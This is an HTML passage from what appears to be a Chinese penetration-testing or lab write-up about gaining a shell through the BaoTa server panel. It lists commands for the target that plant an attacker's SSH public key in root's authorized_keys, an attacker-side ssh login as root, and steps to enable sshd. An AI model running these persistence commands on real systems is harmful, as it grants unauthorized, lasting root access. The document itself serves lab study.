            <div class="markdown-body">
              <p><img src="/2025/10/13/%E5%AE%9D%E5%A1%94%E5%90%8E%E5%8F%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8A%9F%E8%83%BD%E5%8F%8D%E5%BC%B9shell/image-20251016122151242.png" srcset="/img/loading.gif" lazyload alt="image-20251016122151242"></p>
<p><img src="/2025/10/13/%E5%AE%9D%E5%A1%94%E5%90%8E%E5%8F%B0%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%8A%9F%E8%83%BD%E5%8F%8D%E5%BC%B9shell/image-20251013130629020.png" srcset="/img/loading.gif" lazyload alt="image-20251013130629020"></p>
<p>获取ssh —— nc写入公钥</p>
<p>靶机</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 .ssh 并确保权限</span><br><span class="hljs-built_in">mkdir</span> -p /root/.ssh<br><span class="hljs-built_in">chmod</span> 700 /root/.ssh<br><br><span class="hljs-comment"># 以安全方式追加公钥（把 ATTACKER_PUBKEY 替换为你复制的那一行）</span><br><span class="hljs-built_in">cat</span> &gt;&gt; /root/.ssh/authorized_keys &lt;&lt;<span class="hljs-string">&#x27;EOF&#x27;</span><br>ssh-ed25519 AAAA... <span class="hljs-built_in">test</span>@attacker<br>EOF<br><br><span class="hljs-built_in">chmod</span> 600 /root/.ssh/authorized_keys<br><span class="hljs-built_in">ls</span> -l /root/.ssh/authorized_keys<br></code></pre></div></td></tr></table></figure>

<p>攻击机</p>
<figure class="highlight crystal"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crystal">ssh -i ~<span class="hljs-regexp">/.ssh/test</span>_key_gofile root<span class="hljs-variable">@TARGET</span>_IP<br></code></pre></div></td></tr></table></figure>

<p>如果目标没有 sshd 在运行 — 检查并启动&#x2F;安装 sshd</p>
<figure class="highlight nsis"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nsis"><span class="hljs-comment"># 是否有 sshd 进程</span><br>ps aux | grep [s]shd<br><br><span class="hljs-comment"># 或查看 systemd 状态（CentOS）</span><br><span class="hljs-params">system</span>ctl status sshd<br><br>如果已安装但没启动<br><span class="hljs-params">system</span>ctl enable sshd<br><span class="hljs-params">system</span>ctl start sshd<br><span class="hljs-params">system</span>ctl status sshd<br><br></code></pre></div></td></tr></table></figure>
